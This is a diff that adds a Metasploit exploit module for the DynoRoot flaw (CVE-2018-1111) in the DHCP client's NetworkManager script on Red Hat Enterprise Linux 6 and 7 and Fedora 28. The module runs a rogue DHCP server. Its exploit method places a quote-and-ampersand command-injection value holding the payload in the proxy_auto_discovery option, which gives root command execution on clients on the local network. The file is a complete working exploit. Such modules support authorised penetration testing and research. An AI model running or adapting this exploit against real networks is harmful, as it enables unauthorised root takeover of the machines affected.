@@ -1,0 +1,67 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::DHCPServer
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'DHCP Client Command Injection (DynoRoot)',
+      'Description'    => %q{
+        This module exploits the DynoRoot vulnerability, a flaw in how the
+         NetworkManager integration script included in the DHCP client in
+         Red Hat Enterprise Linux 6 and 7, Fedora 28, and earlier
+         processes DHCP options. A malicious DHCP server, or an attacker on
+         the local network able to spoof DHCP responses, could use this flaw
+         to execute arbitrary commands with root privileges on systems using
+         NetworkManager and configured to obtain network configuration using
+         the DHCP protocol.
+      },
+      'Author'         =>
+        [
+          'Felix Wilhelm', # Vulnerability discovery
+          'Kevin Kirsche <d3c3pt10n[AT]deceiveyour.team>' # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'Platform'       => ['unix'],
+      'Arch'           => ARCH_CMD,
+      'Privileged'     => true,
+      'References'     =>
+        [
+          ['AKA', 'DynoRoot'],
+          ['CVE', '2018-1111'],
+          ['EDB': '44652'],
+          ['URL', 'https://github.com/kkirsche/CVE-2018-1111'],
+          ['URL', 'https://twitter.com/_fel1x/status/996388421273882626?lang=en'],
+          ['URL', 'https://access.redhat.com/security/vulnerabilities/3442151'],
+          ['URL', 'https://dynoroot.ninja/'],
+          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2018-1111'],
+          ['URL', 'https://www.tenable.com/blog/advisory-red-hat-dhcp-client-command-injection-trouble'],
+          ['URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1111']
+        ],
+      'Targets'        => [ [ 'Automatic Target', { }] ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'May 15 2018'
+    ))
+
+    deregister_options('DOMAINNAME', 'HOSTNAME', 'URL', 'FILENAME')
+  end
+
+  def exploit
+    hash = datastore.copy
+    start_service(hash)
+    @dhcp.set_option(proxy_auto_discovery: "#{Rex::Text.rand_text_alpha(6..12)}'&#{payload.encoded} #")
+
+    begin
+      while @dhcp.thread.alive?
+        sleep 2
+      end
+    ensure
+      stop_service
+    end
+  end
+end
